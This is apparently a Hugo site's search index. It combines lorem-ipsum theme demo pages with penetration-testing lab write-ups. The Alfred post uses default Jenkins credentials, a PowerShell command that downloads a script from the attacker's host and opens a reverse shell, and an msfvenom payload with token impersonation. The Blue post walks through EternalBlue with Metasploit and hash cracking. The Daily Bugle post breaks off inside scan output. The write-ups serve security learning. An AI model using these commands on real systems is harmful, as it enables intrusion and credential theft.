[{"id":0,"href":"/docs/example/","title":"Example Site","section":"Docs","content":" Introduction # Ferre hinnitibus erat accipitrem dixi Troiae tollens # Lorem markdownum, a quoque nutu est quodcumque mandasset veluti. Passim inportuna totidemque nympha fert; repetens pendent, poenarum guttura sed vacet non, mortali undas. Omnis pharetramque gramen portentificisque membris servatum novabis fallit de nubibus atque silvas mihi. Dixit repetitaque Quid; verrit longa; sententia mandat quascumque nescio solebat litore; noctes. Hostem haerentem circuit plenaque tamen.\nPedum ne indigenae finire invergens carpebat Velit posses summoque De fumos illa foret Est simul fameque tauri qua ad # Locum nullus nisi vomentes. Ab Persea sermone vela, miratur aratro; eandem Argolicas gener.\nMe sol # Nec dis certa fuit socer, Nonacria dies manet tacitaque sibi? Sucis est iactata Castrumque iudex, et iactato quoque terraeque es tandem et maternos vittis. Lumina litus bene poenamque animos callem ne tuas in leones illam dea cadunt genus, et pleno nunc in quod. Anumque crescentesque sanguinis progenies nuribus rustica tinguet. Pater omnes liquido creditis noctem.\nif (mirrored(icmp_dvd_pim, 3, smbMirroredHard) != lion(clickImportQueue, viralItunesBalancing, bankruptcy_file_pptp)) { file += ip_cybercrime_suffix; } if (runtimeSmartRom == netMarketingWord) { virusBalancingWin *= scriptPromptBespoke + raster(post_drive, windowsSli); cd = address_hertz_trojan; soap_ccd.pcbServerGigahertz(asp_hardware_isa, offlinePeopleware, nui); } else { megabyte.api = modem_flowchart - web + syntaxHalftoneAddress; } if (3 \u0026lt; mebibyteNetworkAnimated) { pharming_regular_error *= jsp_ribbon + algorithm * recycleMediaKindle( dvrSyntax, cdma); adf_sla *= hoverCropDrive; templateNtfs = -1 - vertical; } else { expressionCompressionVariable.bootMulti = white_eup_javascript( table_suffix); guidPpiPram.tracerouteLinux += rtfTerabyteQuicktime(1, managementRosetta(webcamActivex), 740874); } var virusTweetSsl = nullGigo; Trepident sitimque # Sentiet et ferali errorem fessam, coercet superbus, Ascaniumque in pennis mediis; dolor? Vidit imi Aeacon perfida propositos adde, tua Somni Fluctibus errante lustrat non.\nTamen inde, vos videt e flammis Scythica parantem rupisque pectora umbras. Haec ficta canistris repercusso simul ego aris Dixit! Esse Fama trepidare hunc crescendo vigor ululasse vertice exspatiantur celer tepidique petita aversata oculis iussa est me ferro.\n"},{"id":1,"href":"/docs/example/table-of-contents/with-toc/","title":"With ToC","section":"Table of Contents","content":" Caput vino delphine in tamen vias # Cognita laeva illo fracta # Lorem markdownum pavent auras, surgit nunc cingentibus libet Laomedonque que est. Pastor An arbor filia foedat, ne fugit aliter, per. Helicona illas et callida neptem est Oresitrophos caput, dentibus est venit. Tenet reddite famuli praesentem fortibus, quaeque vis foret si frondes gelidos gravidae circumtulit inpulit armenta nativum.\nTe at cruciabere vides rubentis manebo Maturuit in praetemptat ruborem ignara postquam habitasse Subitarum supplevit quoque fontesque venabula spretis modo Montis tot est mali quasque gravis Quinquennem domus arsit ipse Pellem turis pugnabant locavit Natus quaerere # Pectora et sine mulcere, coniuge dum tincta incurvae. Quis iam; est dextra Peneosque, metuis a verba, primo. Illa sed colloque suis: magno: gramen, aera excutiunt concipit.\nPhrygiae petendo suisque extimuit, super, pars quod audet! Turba negarem. Fuerat attonitus; et dextra retinet sidera ulnas undas instimulat vacuae generis? Agnus dabat et ignotis dextera, sic tibi pacis feriente at mora euhoeque comites hostem vestras Phineus. Vultuque sanguine dominoque metuit risi fama vergit summaque meus clarissimus artesque tinguebat successor nominis cervice caelicolae.\nLimitibus misere sit # Aurea non fata repertis praerupit feruntur simul, meae hosti lentaque citius levibus, cum sede dixit, Phaethon texta. Albentibus summos multifidasque iungitur loquendi an pectore, mihi ursaque omnia adfata, aeno parvumque in animi perlucentes. Epytus agis ait vixque clamat ornum adversam spondet, quid sceptra ipsum est. Reseret nec; saeva suo passu debentia linguam terga et aures et cervix de ubera. Coercet gelidumque manus, doluit volvitur induta?\nEnim sua # Iuvenilior filia inlustre templa quidem herbis permittat trahens huic. In cruribus proceres sole crescitque fata, quos quos; merui maris se non tamen in, mea.\nGermana aves pignus tecta # Mortalia rudibusque caelum cognosceret tantum aquis redito felicior texit, nec, aris parvo acre. Me parum contulerant multi tenentem, gratissime suis; vultum tu occupat deficeret corpora, sonum. E Actaea inplevit Phinea concepit nomenque potest sanguine captam nulla et, in duxisses campis non; mercede. Dicere cur Leucothoen obitum?\nPostibus mittam est nubibus principium pluma, exsecratur facta et. Iunge Mnemonidas pallamque pars; vere restitit alis flumina quae quoque, est ignara infestus Pyrrha. Di ducis terris maculatum At sede praemia manes nullaque!\n"},{"id":2,"href":"/docs/example/table-of-contents/without-toc/","title":"Without ToC","section":"Table of Contents","content":" At me ipso nepotibus nunc celebratior genus # Tanto oblite # Lorem markdownum pectora novis patenti igne sua opus aurae feras materiaque illic demersit imago et aristas questaque posset. Vomit quoque suo inhaesuro clara. Esse cumque, per referri triste. Ut exponit solisque communis in tendens vincetis agisque iamque huic bene ante vetat omina Thebae rates. Aeacus servat admonitu concidit, ad resimas vultus et rugas vultu dignamque Siphnon.\nQuam iugulum regia simulacra, plus meruit humo pecorumque haesit, ab discedunt dixit: ritu pharetramque. Exul Laurenti orantem modo, per densum missisque labor manibus non colla unum, obiectat. Tu pervia collo, fessus quae Cretenque Myconon crate! Tegumenque quae invisi sudore per vocari quaque plus ventis fluidos. Nodo perque, fugisse pectora sorores.\nSumme promissa supple vadit lenius # Quibus largis latebris aethera versato est, ait sentiat faciemque. Aequata alis nec Caeneus exululat inclite corpus est, ire tibi ostendens et tibi. Rigent et vires dique possent lumina; eadem dixit poma funeribus paret et felix reddebant ventis utile lignum.\nRemansit notam Stygia feroxque Et dabit materna Vipereas Phrygiaeque umbram sollicito cruore conlucere suus Quarum Elis corniger Nec ieiunia dixit Vertitur mos ortu ramosam contudit dumque; placabat ac lumen. Coniunx Amoris spatium poenamque cavernis Thebae Pleiadasque ponunt, rapiare cum quae parum nimium rima.\nQuidem resupinus inducto solebat una facinus quae # Credulitas iniqua praepetibus paruit prospexit, voce poena, sub rupit sinuatur, quin suum ventorumque arcadiae priori. Soporiferam erat formamque, fecit, invergens, nymphae mutat fessas ait finge.\nBaculum mandataque ne addere capiti violentior Altera duas quam hoc ille tenues inquit Sicula sidereus latrantis domoque ratae polluit comites Possit oro clausura namque se nunc iuvenisque Faciem posuit Quodque cum ponunt novercae nata vestrae aratra Ite extrema Phrygiis, patre dentibus, tonso perculit, enim blanda, manibus fide quos caput armis, posse! Nocendo fas Alcyonae lacertis structa ferarum manus fulmen dubius, saxa caelum effuge extremis fixum tumor adfecit bella, potentes? Dum nec insidiosa tempora tegit spirarunt. Per lupi pars foliis, porreximus humum negant sunt subposuere Sidone steterant auro. Memoraverit sine: ferrum idem Orion caelum heres gerebat fixis?\n"},{"id":3,"href":"/docs/example/table-of-contents/","title":"Table of Contents","section":"Example Site","content":" Ubi loqui # Mentem genus facietque salire tempus bracchia # Lorem markdownum partu paterno Achillem. Habent amne generosi aderant ad pellem nec erat sustinet merces columque haec et, dixit minus nutrit accipiam subibis subdidit. Temeraria servatum agros qui sed fulva facta. Primum ultima, dedit, suo quisque linguae medentes fixo: tum petis.\nRapit vocant si hunc siste adspice # Ora precari Patraeque Neptunia, dixit Danae Cithaeron armaque maxima in nati Coniugis templis fluidove. Effugit usus nec ingreditur agmen ac manus conlato. Nullis vagis nequiquam vultibus aliquos altera suum venis teneas fretum. Armos remotis hoc sine ferrea iuncta quam!\nLocus fuit caecis # Nefas discordemque domino montes numen tum humili nexilibusque exit, Iove. Quae miror esse, scelerisque Melaneus viribus. Miseri laurus. Hoc est proposita me ante aliquid, aura inponere candidioribus quidque accendit bella, sumpta. Intravit quam erat figentem hunc, motus de fontes parvo tempestate.\niscsi_virus = pitch(json_in_on(eupViral), northbridge_services_troubleshooting, personal( firmware_rw.trash_rw_crm.device(interactive_gopher_personal, software, -1), megabit, ergonomicsSoftware(cmyk_usb_panel, mips_whitelist_duplex, cpa))); if (5) { managementNetwork += dma - boolean; kilohertz_token = 2; honeypot_affiliate_ergonomics = fiber; } mouseNorthbridge = byte(nybble_xmp_modem.horse_subnet( analogThroughputService * graphicPoint, drop(daw_bit, dnsIntranet), gateway_ospf), repository.domain_key.mouse(serverData(fileNetwork, trim_duplex_file), cellTapeDirect, token_tooltip_mashup( ripcordingMashup))); module_it = honeypot_driver(client_cold_dvr(593902, ripping_frequency) + coreLog.joystick(componentUdpLink), windows_expansion_touchscreen); bashGigabit.external.reality(2, server_hardware_codec.flops.ebookSampling( ciscNavigationBacklink, table + cleanDriver), indexProtocolIsp); Placabilis coactis nega ingemuit ignoscat nimia non # Frontis turba. Oculi gravis est Delphice; inque praedaque sanguine manu non.\nif (ad_api) { zif += usb.tiffAvatarRate(subnet, digital_rt) + exploitDrive; gigaflops(2 - bluetooth, edi_asp_memory.gopher(queryCursor, laptop), panel_point_firmware); spyware_bash.statePopApplet = express_netbios_digital( insertion_troubleshooting.brouter(recordFolderUs), 65); } recursionCoreRay = -5; if (hub == non) { portBoxVirus = soundWeb(recursive_card(rwTechnologyLeopard), font_radcab, guidCmsScalable + reciprocalMatrixPim); left.bug = screenshot; } else { tooltipOpacity = raw_process_permalink(webcamFontUser, -1); executable_router += tape; } if (tft) { bandwidthWeb *= social_page; } else { regular += 611883; thumbnail /= system_lag_keyboard; } Caesorum illa tu sentit micat vestes papyriferi # Inde aderam facti; Theseus vis de tauri illa peream. Oculos uberaque non regisque vobis cursuque, opus venit quam vulnera. Et maiora necemque, lege modo; gestanda nitidi, vero? Dum ne pectoraque testantur.\nVenasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii. Cupiens auctoribus pariter rubet, profana magni super nocens. Vos ius sibilat inpar turba visae iusto! Sedes ante dum superest extrema.\n"},{"id":4,"href":"/docs/example/collapsed/3rd-level/4th-level/","title":"4th Level","section":"3rd Level","content":" 4th Level of Menu # Caesorum illa tu sentit micat vestes papyriferi # Inde aderam facti; Theseus vis de tauri illa peream. Oculos uberaque non regisque vobis cursuque, opus venit quam vulnera. Et maiora necemque, lege modo; gestanda nitidi, vero? Dum ne pectoraque testantur.\nVenasque repulsa Samos qui, exspectatum eram animosque hinc, aut manes, Assyrii. Cupiens auctoribus pariter rubet, profana magni super nocens. Vos ius sibilat inpar turba visae iusto! Sedes ante dum superest extrema.\n"},{"id":5,"href":"/docs/example/collapsed/3rd-level/","title":"3rd Level","section":"Collapsed","content":" 3rd Level of Menu # Nefas discordemque domino montes numen tum humili nexilibusque exit, Iove. Quae miror esse, scelerisque Melaneus viribus. Miseri laurus. Hoc est proposita me ante aliquid, aura inponere candidioribus quidque accendit bella, sumpta. Intravit quam erat figentem hunc, motus de fontes parvo tempestate.\niscsi_virus = pitch(json_in_on(eupViral), northbridge_services_troubleshooting, personal( firmware_rw.trash_rw_crm.device(interactive_gopher_personal, software, -1), megabit, ergonomicsSoftware(cmyk_usb_panel, mips_whitelist_duplex, cpa))); if (5) { managementNetwork += dma - boolean; kilohertz_token = 2; honeypot_affiliate_ergonomics = fiber; } mouseNorthbridge = byte(nybble_xmp_modem.horse_subnet( analogThroughputService * graphicPoint, drop(daw_bit, dnsIntranet), gateway_ospf), repository.domain_key.mouse(serverData(fileNetwork, trim_duplex_file), cellTapeDirect, token_tooltip_mashup( ripcordingMashup))); module_it = honeypot_driver(client_cold_dvr(593902, ripping_frequency) + coreLog.joystick(componentUdpLink), windows_expansion_touchscreen); bashGigabit.external.reality(2, server_hardware_codec.flops.ebookSampling( ciscNavigationBacklink, table + cleanDriver), indexProtocolIsp); "},{"id":6,"href":"/docs/example/hidden/","title":"Hidden","section":"Example Site","content":" This page is hidden in menu # Quondam non pater est dignior ille Eurotas # Latent te facies # Lorem markdownum arma ignoscas vocavit quoque ille texit mandata mentis ultimus, frementes, qui in vel. Hippotades Peleus pennas conscia cuiquam Caeneus quas.\nPater demittere evincitque reddunt Maxime adhuc pressit huc Danaas quid freta Soror ego Luctus linguam saxa ultroque prior Tatiumque inquit Saepe liquitur subita superata dederat Anius sudor Cum honorum Latona # O fallor in sustinui iussorum equidem. Nymphae operi oris alii fronde parens dumque, in auro ait mox ingenti proxima iamdudum maius?\nreality(burnDocking(apache_nanometer), pad.property_data_programming.sectorBrowserPpga(dataMask, 37, recycleRup)); intellectualVaporwareUser += -5 * 4; traceroute_key_upnp /= lag_optical(android.smb(thyristorTftp)); surge_host_golden = mca_compact_device(dual_dpi_opengl, 33, commerce_add_ppc); if (lun_ipv) { verticalExtranet(1, thumbnail_ttl, 3); bar_graphics_jpeg(chipset - sector_xmp_beta); } Fronde cetera dextrae sequens pennis voce muneris # Acta cretus diem restet utque; move integer, oscula non inspirat, noctisque scelus! Nantemque in suas vobis quamvis, et labori!\nvar runtimeDiskCompiler = home - array_ad_software; if (internic \u0026gt; disk) { emoticonLockCron += 37 + bps - 4; wan_ansi_honeypot.cardGigaflops = artificialStorageCgi; simplex -= downloadAccess; } var volumeHardeningAndroid = pixel + tftp + onProcessorUnmount; sector(memory(firewire + interlaced, wired)); "},{"id":7,"href":"/docs/shortcodes/buttons/","title":"Buttons","section":"Shortcodes","content":" Buttons # Buttons are styled links that can lead to local page or external link.\nExample # {{\u0026lt; button relref=\u0026#34;/\u0026#34; [class=\u0026#34;...\u0026#34;] \u0026gt;}}Get Home{{\u0026lt; /button \u0026gt;}} {{\u0026lt; button href=\u0026#34;https://github.com/alex-shpak/hugo-book\u0026#34; \u0026gt;}}Contribute{{\u0026lt; /button \u0026gt;}} Get Home Contribute "},{"id":8,"href":"/docs/shortcodes/columns/","title":"Columns","section":"Shortcodes","content":" Columns # Columns help organize shorter pieces of content horizontally for readability.\n{{\u0026lt; columns \u0026gt;}} \u0026lt;!-- begin columns block --\u0026gt; # Left Content Lorem markdownum insigne... \u0026lt;---\u0026gt; \u0026lt;!-- magic separator, between columns --\u0026gt; # Mid Content Lorem markdownum insigne... \u0026lt;---\u0026gt; \u0026lt;!-- magic separator, between columns --\u0026gt; # Right Content Lorem markdownum insigne... {{\u0026lt; /columns \u0026gt;}} Example # Left Content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\nMid Content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter!\nRight Content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\n"},{"id":9,"href":"/docs/shortcodes/details/","title":"Details","section":"Shortcodes","content":" Details # Details shortcode is a helper for details html5 element. It is going to replace expand shortcode.\nExample # {{\u0026lt; details \u0026#34;Title\u0026#34; [open] \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /details \u0026gt;}} {{\u0026lt; details title=\u0026#34;Title\u0026#34; open=true \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /details \u0026gt;}} Title Markdown content # Lorem markdownum insigne\u0026hellip;\n"},{"id":10,"href":"/docs/shortcodes/expand/","title":"Expand","section":"Shortcodes","content":" Expand # Expand shortcode can help to decrease clutter on screen by hiding part of text. Expand content by clicking on it.\nExample # Default # {{\u0026lt; expand \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /expand \u0026gt;}} Expand ↕ Markdown content # Lorem markdownum insigne\u0026hellip;\nWith Custom Label # {{\u0026lt; expand \u0026#34;Custom Label\u0026#34; \u0026#34;...\u0026#34; \u0026gt;}} ## Markdown content Lorem markdownum insigne... {{\u0026lt; /expand \u0026gt;}} Custom Label ... Markdown content # Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\n"},{"id":11,"href":"/docs/shortcodes/hints/","title":"Hints","section":"Shortcodes","content":" Hints # Hint shortcode can be used as hint/alerts/notification block.\nThere are 3 colors to choose: info, warning and danger.\n{{\u0026lt; hint [info|warning|danger] \u0026gt;}} **Markdown content** Lorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa {{\u0026lt; /hint \u0026gt;}} Example # Markdown content\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa Markdown content\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa Markdown content\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa "},{"id":12,"href":"/docs/shortcodes/mermaid/","title":"Mermaid","section":"Shortcodes","content":" Mermaid Chart # MermaidJS is library for generating svg charts and diagrams from text.\nOverride Mermaid Initialization Config\nTo override the initialization config for Mermaid, create a mermaid.json file in your assets folder!\nExample # {{\u0026lt; mermaid class=\u0026#34;optional\u0026#34; \u0026gt;}} stateDiagram-v2 State1: The state with a note note right of State1 Important information! You can write notes. end note State1 --\u0026gt; State2 note left of State2 : This is the note to the left. {{\u0026lt; /mermaid \u0026gt;}} stateDiagram-v2 State1: The state with a note note right of State1 Important information! You can write notes. end note State1 --\u003e State2 note left of State2 : This is the note to the left. "},{"id":13,"href":"/docs/shortcodes/section/","title":"Section","section":"Shortcodes","content":" Section # Section renders pages in section as definition list, using title and description. Optional param summary can be used to show or hide page summary\nExample # {{\u0026lt; section [summary] \u0026gt;}} First Page First page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. Second Page Second Page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat. Duis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum. "},{"id":14,"href":"/docs/shortcodes/section/first-page/","title":"First Page","section":"Section","content":" First page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\nDuis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n"},{"id":15,"href":"/docs/shortcodes/section/second-page/","title":"Second Page","section":"Section","content":" Second Page # Lorem ipsum dolor sit amet, consectetur adipiscing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamco laboris nisi ut aliquip ex ea commodo consequat.\nDuis aute irure dolor in reprehenderit in voluptate velit esse cillum dolore eu fugiat nulla pariatur. Excepteur sint occaecat cupidatat non proident, sunt in culpa qui officia deserunt mollit anim id est laborum.\n"},{"id":16,"href":"/docs/shortcodes/tabs/","title":"Tabs","section":"Shortcodes","content":" Tabs # Tabs let you organize content by context, for example installation instructions for each supported platform.\n{{\u0026lt; tabs \u0026#34;uniqueid\u0026#34; \u0026gt;}} {{\u0026lt; tab \u0026#34;MacOS\u0026#34; \u0026gt;}} # MacOS Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Linux\u0026#34; \u0026gt;}} # Linux Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; tab \u0026#34;Windows\u0026#34; \u0026gt;}} # Windows Content {{\u0026lt; /tab \u0026gt;}} {{\u0026lt; /tabs \u0026gt;}} Example # MacOS MacOS # This is tab MacOS content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\nLinux Linux # This is tab Linux content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\nWindows Windows # This is tab Windows content.\nLorem markdownum insigne. Olympo signis Delphis! Retexi Nereius nova develat stringit, frustra Saturnius uteroque inter! Oculis non ritibus Telethusa protulit, sed sed aere valvis inhaesuro Pallas animam: qui quid, ignes. Miseratus fonte Ditis conubia.\n"},{"id":17,"href":"/posts/2023-05-12-05-Alfred/","title":"Alfred","section":"Blog","content":"Exploit Jenkins to gain an initial shell, then escalate your privileges by exploiting Windows authentication tokens.\nScanning # Let\u0026rsquo;s begin scanning the target using Rustscan.\nrustscan -a 10.10.174.157 -r 1-65535 --ulimit 5000 -- -sVC From the port scan, we can see that there are three open ports. Let\u0026rsquo;s look what\u0026rsquo;s running on that ports.\nEnumeration # There is nothing interesting on port 80. But on port 8080, there is Jenkins running. All we can see is a login page. Let\u0026rsquo;s try to use the default usernames:passwords, and then we will use automated tools to brute force the login page.\nOn using admin as username and admin as password, we are able to successfully login into the Jenkins server.\nWe can see a project that was already created. On clicking, it takes us to the following page.\nThe configure button on the left side leads to a page where we can execute Windows batch commands under the build section.\nLet us try to see if it is working. We will now change the command to ipconfig and see if it works.\nSave it and build.\nAfter building, we will check the build history.\nUnder console output, we can see that there is output for the command we used earlier.\nExploitation # We will download Nishang into our machine and use the Invoke-PowerShellTcp.ps1 to get the reverse shell.\ngit clone https://github.com/samratashok/nishang.git cd nishang Start the python webserver to host the file so that we can download it to the target machine.\npython -m http.server Now copy the following command into the build section where we can execute commands. This command downloads the powershell script from our webserver and runs it on the target machine using the ip address and port that we specify as arguments. We will be using our machine ip address and the port that we want to use for the reverse shell.\npowershell iex (New-Object Net.WebClient).DownloadString(\u0026#39;http://10.6.29.149:8000/Invoke-PowerShellTcp.ps1\u0026#39;);Invoke-PowerShellTcp -Reverse -IPAddress 10.6.29.149 -Port 3333 Save the changes and apply.\nIn a new terminal window, use netcat to listen on port 3333.\nnc -lnvp 3333 Now build the project.\nAnd we get a reverse shell!\nNow we will elevate our shell to a meterpreter reverse shell.\nWe will generate a payload that we can run on the target machine and get a reverse shell in meterpreter.\nmsfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.6.29.149 LPORT=4444 -f exe -o shell.exe Launch metasploit. Use multi/handler with the meterpreter payload set.\nmsfconsole -q use multi/handler set payload windows/meterpreter/reverse_tcp set lhost tun0 set lport 4444 run Again start the python http server and download the generated payload to the target machine and run it.\npowershell \u0026#34;(New-Object System.Net.WebClient).Downloadfile(\u0026#39;http://10.6.29.149:8000/shell.exe\u0026#39;,\u0026#39;shell.exe\u0026#39;)\u0026#34; Start-Process \u0026#34;shell.exe\u0026#34; Go back to metasploit and we get a meterpreter session opened.\nPrivilege Escalation # Let\u0026rsquo;s check the privileges for the user that we are currenlty logged in.\nwhoami /priv We can see that the SeImpersonatePrivilege is enabled. Let\u0026rsquo;s try token impersonation.\nLoad the incognito module and list the available tokens.\nload incognito list_tokens -g We can see that there is BUILTIN\\Administrators token available. Let\u0026rsquo;s impersonate that token.\nimpersonate_token \u0026#34;BUILTIN\\Administrators\u0026#34; ```shell Now we will check if we got the privileged access. ```shell getuid We can see that we have higher privileged token but we will not get permissions of privileged user unless we migrate our process to another process with correct privileges . We will migrate our process from shell.exe to services.exe so that we can get the permissions of a privileged user.\nWe will check the processes and then migrate from shell.exe to services.exe.\nps Use the PID of the services.exe to migrate.\nmigrate 668 Now have privileged access and we can read the root flag located at C:\\Windows\\System32\\config.\n"},{"id":18,"href":"/posts/Blue/","title":"Blue","section":"Blog","content":"Deploy \u0026amp; hack into a Windows machine, leveraging common misconfigurations issues.\nTask 1 # Scan the machine for open ports and vulnerabilities using nmap.\nnmap -sVC --script vuln 10.10.91.185 From the scan results we can see that the machine is vulnerable to ms17-010.\nTask 2 # Let\u0026rsquo;s open metasploit.\nmsfconsole -q Search for the exploit ms17-010 and use exploit/windows/smb/ms17_010_eternalblue.\nsearch ms17-010 use 0 Approach 1 # The payload is set by default to windows/x64/meterpreter/reverse tcp.\nSee the available options and change the rport and lhost.\nshow options set rhosts 10.10.91.185 set lhost tun0 Run the exploit.\nexploit We now got a meterpreter shell. Let\u0026rsquo;s quickly find out the information about the machine. We are logged in as nt authority\\system. Now we have all privileges to the machine.\nApproach 2 # Set the payload to windows/x64/shell/reverse_tcp.\nset payload windows/x64/shell/reverse_tcp See the available options and change the rport and lhost.\nshow options set rhosts 10.10.91.185 set lhost tun0 Run the exploit.\nexploit We now got a shell and we will elevate this shell to meterpreter shell. Background the shell by hitting Ctrl+Z.\nUse the module post/multi/manage/shell_to_meterpreter to get a meterpreter shell from the existing non-meterpreter shell.\nSet lhost, session and run it.\nset lhost tun0 set session 2 exploit Task 3 # Let\u0026rsquo;s check whether we are running as nt authority\\system or not using getsystem.\ngetsystem We are already running as SYSTEM and run ps to list all the processes.\nps We will now migrate to a different process that is running as NT AUTHORITY\\SYSTEM.\nmigrate 704 Task 4 # We can run hashdump in the meterpreter shell to get the hashes.\nThen we will crack the hash of user Jon with John The Ripper.\njohn hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt Task 5 # Now let\u0026rsquo;s find the flags. The first flag is located in the location C:\\ .\nThe second flag is located at the location where passwords are stored. The passwords are stored in SAM file. So, the second flag would be in the location C: \\windows\\system32\\config.\nThe third flag is located in the Documents folder of the user Jon.\n"},{"id":19,"href":"/posts/2023-05-12-09-DailyBugle/","title":"Daily Bugle","section":"Blog","content":"Compromise a Joomla CMS account via SQLi, practise cracking hashes and escalate your privileges by taking advantage of yum.\nScanning # Let\u0026rsquo;s begin by scanning the target.\nrustscan -a 10.10.59.64 -r 1-65535 --ulimit 5000 -- -sVC (root㉿kali)-[~/tryhackme] └─# rustscan -a 10.10.59.64 -r 1-65535 --ulimit 5000 -- -sVC .----. .-. .-. .----..---. .----. .---. .--. .-. .-. | {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| | | .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ | `-\u0026#39; `-\u0026#39;`-----\u0026#39;`----\u0026#39; `-\u0026#39; `----\u0026#39; `---\u0026#39; `-\u0026#39; `-\u0026#39;`-\u0026#39; `-\u0026#39; The Modern Day Port Scanner. ________________________________________ : http://discord.skerritt.blog : : https://github.com/RustScan/RustScan : -------------------------------------- 0day was here ♥ [~] The config file is expected to be at \u0026#34;/root/.rustscan.toml\u0026#34; [~] Automatically increasing ulimit value to 5000. Open 10.10.59.64:22 Open 10.10.59.64:80 Open 10.10.59.64:3306 [~] Starting Script(s) [\u0026gt;] Running script \u0026#34;nmap -vvv -p {{port}} {{ip}} -sVC\u0026#34; on ip 10.10.59.64 Depending on the complexity of the script, results may take some time to appear. [~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-19 23:05 EDT NSE: Loaded 155 scripts for scanning. NSE: Script Pre-scanning. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:05 Completed NSE at 23:05, 0.00s elapsed Initiating Ping Scan at 23:05 Scanning 10.10.59.64 [4 ports] Completed Ping Scan at 23:05, 0.12s elapsed (1 total hosts) Initiating Parallel DNS resolution of 1 host. at 23:05 Completed Parallel DNS resolution of 1 host. at 23:05, 0.06s elapsed DNS resolution of 1 IPs took 0.06s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0] Initiating SYN Stealth Scan at 23:05 Scanning 10.10.59.64 [3 ports] Discovered open port 22/tcp on 10.10.59.64 Discovered open port 80/tcp on 10.10.59.64 Discovered open port 3306/tcp on 10.10.59.64 Completed SYN Stealth Scan at 23:05, 0.13s elapsed (3 total ports) Initiating Service scan at 23:05 Scanning 3 services on 10.10.59.64 Completed Service scan at 23:06, 16.47s elapsed (3 services on 1 host) NSE: Script scanning 10.10.59.64. NSE: Starting runlevel 1 (of 3) scan. Initiating NSE at 23:06 NSE Timing: About 98.57% done; ETC: 23:06 (0:00:00 remaining) NSE Timing: About 99.76% done; ETC: 23:07 (0:00:00 remaining) Completed NSE at 23:07, 67.89s elapsed NSE: Starting runlevel 2 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 7.52s elapsed NSE: Starting runlevel 3 (of 3) scan. Initiating NSE at 23:07 Completed NSE at 23:07, 0.00s elapsed Nmap scan report for 10.10.59.64 Host is up, received echo-reply ttl 61 (0.092s latency). Scanned at 2023-03-19 23:05:49 EDT for 92s PORT STATE SERVICE REASON VERSION 22/tcp open ssh syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0) | ssh-hostkey: | 2048 68ed7b197fed14e618986dc58830aae9 (RSA) | ssh-rsa 